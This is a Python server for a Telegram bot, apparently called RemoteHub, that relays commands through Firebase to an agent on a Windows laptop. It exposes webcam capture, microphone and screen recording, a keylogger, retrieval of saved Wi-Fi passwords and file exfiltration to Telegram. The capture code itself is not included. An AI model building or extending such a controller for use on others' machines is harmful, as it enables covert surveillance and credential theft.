import json
import os
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import requests
from dotenv import load_dotenv
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

from commands import drive

load_dotenv()


def ensure_drive_token() -> None:
    """Render-də token.json git-ə düşməsin deyə env-dən yazırıq."""
    raw = os.environ.get("GOOGLE_TOKEN_JSON", "").strip()
    if not raw:
        return
    json.loads(raw)
    Path("token.json").write_text(raw, encoding="utf-8")


def start_health_server() -> None:
    """Render Web Service $PORT-u dinləməlidir, yoxsa instans düşür."""

    class HealthHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"ok")

        def log_message(self, format, *args):
            return

    port = int(os.environ.get("PORT", "10000"))
    server = ThreadingHTTPServer(("0.0.0.0", port), HealthHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"[+] Health server 0.0.0.0:{port}")


ensure_drive_token()

TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN is missing. Set it in Render Environment.")

FIREBASE_URL = os.environ.get("FIREBASE_URL", "").rstrip("/")
if not FIREBASE_URL:
    raise ValueError("FIREBASE_URL is missing. Set it in Render Environment.")

ALLOWED_USER_ID = 6426820534

def authorized(update: Update) -> bool:
    return update.effective_user is not None and update.effective_user.id == ALLOWED_USER_ID

def send_to_firebase(action: str, chat_id: int):
    # Firebase-ə əmri yazırıq
    url = f"{FIREBASE_URL}/pc_command.json"
    data = {
        "action": action,
        "chat_id": chat_id,
        "timestamp": int(time.time())
    }
    print(f"DEBUG: Firebase-ə yazılır -> {url} : {data}")
    res = requests.put(url, json=data)
    print(f"DEBUG: Firebase cəvabı -> {res.status_code}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update):
        return
    message = (
        "🤖 <b>RemoteHub (Master Bot - Bulud)</b>\n\n"
        "☁️ <b>Bulud xidmətləri:</b>\n"
        "/drive — Google Drive faylları və qovluqlar\n\n"
        "📊 <b>Sistem:</b>\n"
        "/status — CPU, RAM, Disk və batareya\n"
        "/battery — Batareya məlumatı\n"
        "/location — Xarici IP və məkan\n\n"
        "📷 <b>Nəzarət:</b>\n"
        "/screenshot — Ekran görüntüsü\n"
        "/webcam — Veb-kamera fotosu\n"
        "/record — Ekran videoyazısı (def. 15 san.)\n"
        "/mic — Ətraf səs yazısı (def. 10 san.)\n"
        "/listen — Ətraf səs yazısı (10 san.)\n"
        "/keylog — Keylogger (start/stop)\n\n"
        "🎵 <b>Media:</b>\n"
        "/play — Mahnını oxut / dayandır\n"
        "/pause — Mahnını dayandır\n"
        "/next — Növbəti mahnı\n"
        "/prev — Əvvəlki mahnı\n\n"
        "🔊 <b>Əlavə:</b>\n"
        "/say &lt;mətn&gt; — Noutbukdan səslə de\n"
        "/open &lt;link&gt; — Sayt/proqram aç\n"
        "/msg &lt;mətn&gt; — Ekrana popup mesaj\n"
        "/download &lt;yol&gt; — Faylı Telegram-a göndər\n"
        "/wifi — Yaddaşdakı Wi-Fi şifrələri\n\n"
        "🔧 <b>İdarəetmə:</b>\n"
        "/lock — Windows-u kilidlə\n"
        "/shutdown — Kompüteri söndür\n"
        "/restart — Yenidən başlat\n"
        "/cancel_shutdown — Söndürülməni ləğv et\n"
    )
    await update.message.reply_text(message, parse_mode="HTML")

async def handle_pc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update):
        return
    
    # /mic 15 -> "mic 15" kimi tam gonderilir ki, pc_agent duration-u oxuya bilsin
    command = update.message.text.lstrip("/")
    print(f"DEBUG: Telegramdan əmr gəldi: {command}")
    
    # Firebase-ə göndəririk
    send_to_firebase(command, update.effective_chat.id)
    
    await update.message.reply_text(f"⏳ Əmr ('{command}') noutbuka göndərildi... Noutbuk açıqdırsa, dərhal icra ediləcək.")

if __name__ == "__main__":
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    
    # Google Drive handler-ləri
    for handler in drive.get_drive_handlers():
        app.add_handler(handler)
    
    # Noutbuka aid olan bütün komandaları Firebase-ə yönləndiririk
    pc_commands = [
        "status", "battery", "location",
        "screenshot", "webcam", "record", "mic", "listen", "keylog",
        "play", "pause", "next", "prev",
        "say", "open", "msg", "download", "wifi",
        "lock", "shutdown", "restart", "cancel_shutdown",
    ]
    for cmd in pc_commands:
        app.add_handler(CommandHandler(cmd, handle_pc_command))

    # ── Telegram-ın "/" menyusuna əmrləri qeydiyyatdan keçiririk ──
    from telegram import BotCommand
    import asyncio

    commands = [
        BotCommand("start",           "Botun menyusu"),
        BotCommand("drive",           "Google Drive faylları"),
        BotCommand("status",          "CPU, RAM, Disk, batareya"),
        BotCommand("battery",         "Batareya məlumatı"),
        BotCommand("location",        "Xarici IP və məkan"),
        BotCommand("screenshot",      "Ekran görüntüsü"),
        BotCommand("webcam",          "Veb-kamera fotosu"),
        BotCommand("record",          "Ekran videoyazısı (def. 15 san)"),
        BotCommand("mic",             "Mikrofon yazısı (def. 10 san)"),
        BotCommand("listen",          "Mikrofon yazısı (10 san)"),
        BotCommand("keylog",          "Keylogger: start və ya stop"),
        BotCommand("play",            "Media: Play / Pause"),
        BotCommand("pause",           "Media: Pause"),
        BotCommand("next",            "Media: Növbəti mahnı"),
        BotCommand("prev",            "Media: Əvvəlki mahnı"),
        BotCommand("say",             "Noutbukdan səslə de"),
        BotCommand("open",            "Sayt və ya proqram aç"),
        BotCommand("msg",             "Ekrana popup mesaj"),
        BotCommand("download",        "Faylı Telegram-a göndər"),
        BotCommand("wifi",            "Yaddaşdakı Wi-Fi şifrələri"),
        BotCommand("lock",            "Windows-u kilidlə"),
        BotCommand("shutdown",        "Kompüteri söndür"),
        BotCommand("restart",         "Yenidən başlat"),
        BotCommand("cancel_shutdown", "Söndürülməni ləğv et"),
    ]

    async def post_init(application):
        await application.bot.set_my_commands(commands)
        print("[+] Telegram komanda menyusu qeydiyyatdan kecdi!")

    app.post_init = post_init

    print("[+] Master Bot (Bulud) ise dushdu...")
    start_health_server()
    app.run_polling()
